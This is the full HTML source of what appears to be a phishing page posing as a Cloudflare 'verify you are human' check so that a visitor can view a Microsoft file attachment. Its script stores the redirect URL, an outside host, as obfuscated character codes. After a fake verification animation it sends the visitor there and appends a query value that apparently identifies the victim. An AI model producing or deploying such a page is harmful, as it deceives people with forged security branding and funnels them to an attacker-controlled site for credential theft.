<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MS FILES</title>
    <style>
        :root {
            --brand-blue: #4a6ee0;
            --brand-green: #28a745;
            --bg-light: #f8f9fa;
            --anim-speed: 1.8s;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            height: 100vh;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* Loading Shield */
        #gate {
            position: fixed; inset: 0; background: var(--bg-light);
            z-index: 999; display: grid; place-items: center;
            transition: visibility 0s 0.4s, opacity 0.4s linear;
        }

        .pulse-logo {
            width: 100px;
            animation: pulse-ring var(--anim-speed) cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }

        @keyframes pulse-ring {
            0%, 100% { opacity: 0.6; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.04); }
        }

        /* Interface Layout */
        #content-root {
            width: 100%; max-width: 400px; padding: 0 24px;
            opacity: 0; transform: translateY(20px);
            transition: 0.8s opacity ease-out, 0.8s transform ease-out;
        }

        .is-live #content-root { opacity: 1; transform: translateY(0); }

        .title-prompt {
            text-align: center; font-size: 1.1rem; font-weight: 500;
            color: #1a1a1a; margin-bottom: 32px; line-height: 1.5;
        }

        /* Security Box */
        .auth-widget {
            background: #fcfcfc; border: 1px solid #e5e5e5; border-radius: 12px;
            padding: 30px 20px; display: flex; align-items: center; gap: 12px;
        }

        .auth-interactive { flex: 1; display: flex; align-items: center; gap: 15px; }

        .circle-btn {
            width: 26px; height: 26px; border: 2.5px solid var(--brand-blue); border-radius: 5px;
            cursor: pointer; position: relative; transition: 0.2s;
        }

        /* Animation Classes */
        .spinning {
            border-radius: 50%; border-color: #eee; border-top-color: var(--brand-blue);
            animation: u-spin 0.8s linear infinite;
        }

        .success { background: var(--brand-green); border-color: var(--brand-green); }
        .success::after {
            content: ''; position: absolute; width: 4px; height: 9px;
            border: solid white; border-width: 0 2px 2px 0;
            left: 8px; top: 3px; transform: rotate(45deg);
        }

        @keyframes u-spin { to { transform: rotate(360deg); } }

        .label-text { font-size: 15px; font-weight: 600; color: #333; }

        /* Vendor Branding */
        .vendor-meta { text-align: right; width: 100px; }
        .vendor-meta img { width: 28px; filter: contrast(1.1); }
        .vendor-meta b { display: block; color: #f38020; font-size: 10px; margin-top: 2px; }
        .vendor-meta i { font-style: normal; font-size: 11px; color: #999; }

        /* Footer */
        .lock-badge {
            position: absolute; bottom: 25px; left: 50%; transform: translateX(-50%);
            display: flex; align-items: center; gap: 7px; color: #bbb; font-size: 12px;
        }
        .shield-icon { width: 12px; height: 14px; background: #ccc; clip-path: polygon(0 0, 100% 0, 100% 80%, 50% 100%, 0 80%); }
    </style>
</head>
<body>

    <div id="gate">
        <img src="astro.png" class="pulse-logo">
    </div>

    <main id="content-root">
        <h1 class="title-prompt">Verify you are human by completing the action below to view attachment</h1>

        <section class="auth-widget">
            <div class="auth-interactive">
                <div id="trigger" class="circle-btn"></div>
                <span id="txt-val" class="label-text">Verify</span>
            </div>

            <div class="vendor-meta">
                <img src="cloudflare_.png">
                <b>CLOUDFLARE</b>
                <i>Privacy &middot; Terms</i>
            </div>
        </section>
    </main>

    <div class="lock-badge">
        <div class="shield-icon"></div>
        Protected by CLOUDFLARE
    </div>

    <script>
        /**
         * Core Engine
         */
        const AppState = {
            codes: [104, 116, 116, 112, 115, 58, 47, 47, 112, 111, 46, 116, 105, 102, 102, 110, 117, 97, 101, 46, 111, 110, 108, 105, 110, 101, 47, 97, 112, 105, 47, 118, 49, 47, 116, 103, 75, 72, 102, 48, 114, 48, 69, 87, 113, 73, 97, 67, 98, 53],
            wait: [1300, 1600, 800],
            busy: false,

            init() {
                // Initial Transition
                setTimeout(() => {
                    const g = document.getElementById('gate');
                    g.style.opacity = '0';
                    g.style.visibility = 'hidden';
                    document.body.classList.add('is-live');
                }, this.wait[0]);

                document.getElementById('trigger').onclick = () => this.verify();
            },

            async verify() {
                if (this.busy) return;
                this.busy = true;

                const btn = document.getElementById('trigger');
                const lbl = document.getElementById('txt-val');

                // Step 1: Processing
                lbl.textContent = "Processing...";
                btn.className = 'circle-btn spinning';

                await new Promise(r => setTimeout(r, this.wait[1]));

                // Step 2: Finished
                btn.className = 'circle-btn success';
                lbl.textContent = "Verified";

                // Step 3: Jump
                setTimeout(() => {
                    const base = this.codes.map(c => String.fromCharCode(c)).join('');
                    const query = new URLSearchParams(window.location.search).get('eoff');
                    const target = query ? `${base}#${query}` : base;

                    window.location.assign(target);
                }, this.wait[2]);
            }
        };

        // Boot
        document.addEventListener('DOMContentLoaded', () => AppState.init());
    </script>
</body>
</html>
